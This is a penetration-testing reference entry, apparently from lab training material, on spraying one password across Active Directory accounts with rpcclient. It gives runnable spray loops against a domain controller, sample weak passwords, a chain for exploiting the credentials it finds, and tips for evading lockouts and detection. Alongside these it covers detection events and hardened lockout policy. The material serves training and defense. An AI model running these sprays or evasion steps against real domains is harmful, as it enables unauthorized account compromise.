name: rpcclient - Password Spray via MS-RPC
command: for u in $(cat <userlist>); do rpcclient -U "$u%<password>" -c 'getusername;quit' <dc_ip> 2>/dev/null | grep 'Account Name'; done
description: Sprays one password against a user list via MS-RPC (port 445/TCP). Alternative to Kerberos and SMB-based spray methods. Useful when Kerberos spray is blocked and you need a fallback. Successful auth returns 'Account Name' output; failures return nothing.
source: CPTS Module 13: Active Directory Enumeration & Attacks
notes:
=== WHY RPCCLIENT FOR SPRAYING ===
rpcclient uses MS-RPC over SMB (port 445) to authenticate, then runs a command.
The spray logic is: try auth, if it works the getusername command returns output,
if auth fails rpcclient exits silently. grep filters for success.

=== HOW TO READ OUTPUT ===
Success:  Account Name: jsmith, Authority Name: INLANEFREIGHT
Failure:  (empty — rpcclient exits, grep finds nothing)
Pipe | grep 'Account Name' shows only successful authentications.

=== WHEN TO USE RPCCLIENT SPRAY ===
Use when:
  - Kerberos spray (kerbrute) is being blocked
  - CME spray is being detected/rate-limited
  - You want a third spray vector to rotate through
  - You're testing RPC access for later enumeration use

=== LOCKOUT CAUTION ===
This loop has NO built-in lockout awareness — it will blast every user at
full speed. Always check lockout policy before running:
  crackmapexec smb <dc> -u user -p pass --pass-pol
Consider adding sleep: sleep 1 after each iteration if threshold is low.

=== SPRAY CHAIN ===
1. Enumerate lockout policy
2. Build valid user list (kerbrute userenum or CME --users)
3. Choose password (season+year, company+1!, Welcome+year)
4. Spray (kerbrute → CME SMB → rpcclient as fallback)
5. Validate hits with CME (check Pwn3d!)
6. Feed creds into BloodHound + Evil-WinRM

examples.label: Spray against DC
examples.command: for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c 'getusername;quit' 172.16.5.5 2>/dev/null | grep 'Account Name'; done

examples.label: With username visible in output
examples.command: for u in $(cat valid_users.txt); do echo "Trying $u"; rpcclient -U "$u%Spring2022" -c 'getusername;quit' 172.16.5.5 2>/dev/null | grep 'Account Name'; done

references.title: HTB Academy - Active Directory Enumeration & Attacks

defense.why_it_works: The service performs no (or weak) rate-limiting/lockout, so an attacker can submit many username/password guesses. Password reuse and weak/default passwords mean a modest wordlist often lands a valid credential. Each rpcclient bind tests one credential over SAMR; low-and-slow spraying avoids lockout.
defense.prerequisites: A domain user list, candidate password(s), and network access to the auth service.
defense.detection: Failed-authentication bursts: Windows 4625 / Kerberos 4771; account lockouts (4740). Spraying = one password across MANY accounts (few failures each - a subtle, distributed pattern). Defender for Identity flags spraying.
defense.artifacts: RPC auth attempts across accounts; 4625 bursts.
defense.prevention: [MITRE T1110.003 M1032 MFA] MFA defeats spraying; [M1027] strong/unique passwords + [M1036 Account Use Policies] lockout thresholds; alert on distributed failed logons and impossible travel.
defense.evasion: Spray one password low-and-slow with delays to avoid lockouts and volume alerts; rotate source hosts; Kerberos-based spraying avoids 4625.
defense.misconfiguration: The domain's lockout policy is either disabled or set with a threshold high enough (e.g., 10 attempts before lockout) that a low-and-slow spray — one guess per account per 30 minutes — never triggers lockout. Additionally, many accounts share the same simple passwords (company name + year, Season+Year), and the bad-password counter resets after the observation window elapses.
defense.vulnerable_config:
# Weak lockout policy (domain default or intentionally lenient):
# Fine-Grained Password Policy:
Get-ADDefaultDomainPasswordPolicy
# LockoutObservationWindow: 00:30:00
# LockoutThreshold:         0          <-- DISABLED! No lockout ever
# OR: LockoutThreshold: 10 (attacker sprays 9 per window, never locks)

# Also: accounts with password = company name:
# Common passwords: Summer2023!, Winter2024!, CompanyName1!
defense.secure_config:
# Set a strong lockout policy:
# Via Default Domain Policy or Fine-Grained Password Policy (PSO):
Set-ADDefaultDomainPasswordPolicy -Identity corp.local \
    -LockoutDuration 00:30:00 \
    -LockoutObservationWindow 00:30:00 \
    -LockoutThreshold 5
# LockoutThreshold 5 means 5 bad attempts in 30 min = 30-min lockout

# Fine-Grained PSO for admins (stricter):
New-ADFineGrainedPasswordPolicy -Name AdminPSO \
    -LockoutThreshold 3 -LockoutDuration 01:00:00 \
    -LockoutObservationWindow 01:00:00 \
    -Precedence 1
Add-ADFineGrainedPasswordPolicySubject AdminPSO -Subjects 'Domain Admins'

# Enable Azure AD / Entra ID Password Protection (bans common passwords):
# Also available on-premises via the Azure AD Password Protection agent

# Monitor Event 4740 (Account Locked Out) — spray leaves a cluster of these

variations.label: Loop over a userlist
variations.command: for u in $(cat <userlist>); do rpcclient -U "$u%<password>" -c 'getusername;quit' <dc_ip> 2>&1 | grep -v NT_STATUS; done
